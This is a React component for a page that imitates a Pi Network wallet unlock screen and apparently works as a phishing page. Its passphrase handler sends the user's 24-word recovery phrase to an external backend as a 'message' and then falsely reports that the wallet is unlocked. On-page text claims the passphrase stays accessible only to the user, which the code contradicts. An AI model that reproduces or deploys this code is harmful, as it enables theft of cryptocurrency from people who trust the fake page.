import { useState } from 'react';
import { useNavigate } from 'react-router';

export default function WalletPage() {
  const navigate = useNavigate();
  const [passphrase, setPassphrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleBack = () => {
    navigate('/mine/validate');
  };

  const handleUnlockWithPassphrase = async () => {
    if (!passphrase.trim()) {
      alert('Please enter your 24-word passphrase');
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch('https://pinetp2p-backend.onrender.com/api/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: passphrase.trim(),
          userIdentifier: `user_${Date.now()}`
        }),
      });

      const data = await response.json();
      if (data.success) {
        alert('Wallet unlocked successfully!');
      } else {
        alert('Failed to unlock wallet.');
      }
    } catch (error) {
      console.error(error);
      alert('Error unlocking wallet.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleUnlockWithFingerprint = () => {
    alert('Fingerprint unlock coming soon!');
  };

  return (
    <div className="wallet-container">
      <style>{`
        body {
          font-family: 'Roboto', sans-serif;
        }
        .wallet-container {
          min-height: 80vh;
          background: #fff;
          display: flex;
          flex-direction: column;
        }
        .wallet-header {
          background: #783A8D;
          color: white;
          padding: 12px 20px;
          display: flex;
          align-items: center;
          position: relative;
          height: 60px;
        }
        .back-arrow {
          font-size: 24px;
          cursor: pointer;
          color: white;
          position: absolute;
          left: 20px;
        }
        .header-content {
          display: flex;
          align-items: center;
          position: absolute;
          left: 50%;
          transform: translateX(-50%);
          gap: 12px; /* space between logos */
        }
        .wallet-icon {
          width: 32px;
          height: 32px;
        }
        .header-title {
          font-size: 18px;
          font-weight: 500;
          color: white;
        }
        .wallet-content {
          flex: 1;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          padding: 20px;
          text-align: center;
        }
        .unlock-title {
          font-size: 24px;
          font-weight: bold;
          margin-bottom: 20px;
        }
        .passphrase-input {
          width: 400px;
          max-width: 90%;
          min-height: 180px;
          padding: 15px;
          border: 2px solid #daa520;
          border-radius: 8px;
          font-size: 16px;
          margin-bottom: 20px;
          resize: none;
        }
        .button {
          width: 400px;
          max-width: 90%;
          padding: 15px;
          font-size: 16px;
          font-weight: bold;
          border-radius: 8px;
          cursor: pointer;
          margin-bottom: 15px;
          transition: all 0.3s ease;
        }
        .passphrase-btn {
          background: #fff;
          border: 2px solid #783A8D;
          color: #783A8D;
        }
        .passphrase-btn:hover {
          background: #f5e6f9;
        }
        .fingerprint-btn {
          background: #783A8D;
          color: white;
          border: none;
        }
        .fingerprint-btn:hover {
          background: #6a3278;
        }
        .info-text {
          margin-top: 15px;
          font-size: 14px;
          color: #555;
          max-width: 400px;
        }
        .info-text a {
          color: #783A8D;
          text-decoration: underline;
        }
      `}</style>

      <header className="wallet-header">
        <div className="back-arrow" onClick={handleBack}>←</div>
        <div className="header-content">
          <img src="/images/wallet1.png" alt="Logo 1" className="wallet-icon" />
          <span className="header-title">Wallet</span>
          <img src="/images/wallet2.png" alt="Logo 2" className="wallet-icon" />
        </div>
      </header>

      <div className="wallet-content">
        <h1 className="unlock-title">Unlock Pi Wallet</h1>
        
        <textarea
          className="passphrase-input"
          placeholder="Enter your 24-word passphrase here"
          value={passphrase}
          onChange={(e) => setPassphrase(e.target.value)}
        />

        <button 
          className="button passphrase-btn"
          onClick={handleUnlockWithPassphrase}
          disabled={isLoading}
        >
          {isLoading ? 'Unlocking...' : 'UNLOCK WITH PASSPHRASE'}
        </button>

        <button 
          className="button fingerprint-btn"
          onClick={handleUnlockWithFingerprint}
        >
          UNLOCK WITH FINGERPRINT
        </button>

        <p className="info-text">
          As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
          Recovery of passphrase is currently impossible.
        </p>
        <p className="info-text">
          Lost your passphrase? <a href="#">You can create a new wallet</a>, 
          but all your π in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
}
